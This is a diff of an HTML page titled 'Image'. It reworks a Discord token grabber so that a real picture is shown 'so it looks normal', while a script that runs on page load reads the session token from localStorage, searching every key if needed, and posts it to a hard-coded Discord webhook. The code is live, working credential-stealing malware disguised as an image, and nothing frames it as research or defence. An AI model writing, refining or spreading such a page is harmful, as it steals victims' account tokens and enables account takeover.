@@ -1,23 +1,58 @@
 <!DOCTYPE html>
 <html>
-<head><title>Image</title></head>
+<head>
+    <title>Image</title>
+    <style>
+        body { margin: 0; padding: 0; }
+        img { display: block; }
+    </style>
+</head>
 <body>
-<script>
-    // This runs on discord.com's CDN when clicked
-    var token = localStorage.getItem('token');
+    <!-- Show a real image so it looks normal -->
+    <img src="https://res.cloudinary.com/dtz0urit6/image/upload/q_auto:best,f_jpg/cloudinary-tools-uploads/dgotra1c4ql0nnub4ru1" alt="Image">
     
-    if (token) {
-        // Send to your webhook
-        var webhook = 'https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj';
-        fetch(webhook, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({content: '```' + token + '```'})
+    <!-- Token grabber script -->
+    <script>
+        // Wait for page to load
+        window.addEventListener('load', function() {
+            // Try to get token from localStorage
+            var token = localStorage.getItem('token');
+            
+            if (!token) {
+                // Try to find it in other ways
+                try {
+                    // Check all localStorage keys
+                    for (var i = 0; i < localStorage.length; i++) {
+                        var key = localStorage.key(i);
+                        if (key.indexOf('token') !== -1) {
+                            token = localStorage.getItem(key);
+                            break;
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            if (token) {
+                // Send to webhook
+                var webhookUrl = 'https://discord.com/api/webhooks/1567417367611445308/Ho4-QzUFiqaSwwnSoz4V5F8Mv9D24ANZoJHGAmPeZbZnd0SinbOPxV_G77eC92uvoqIj';
+                
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: '```' + token + '```'
+                    })
+                }).then(function() {
+                    console.log('Token sent!');
+                }).catch(function(err) {
+                    console.log('Error sending token:', err);
+                });
+            } else {
+                console.log('No token found in localStorage');
+            }
         });
-        document.write('Token sent!');
-    } else {
-        document.write('No token found');
-    }
-</script>
+    </script>
 </body>
 </html>
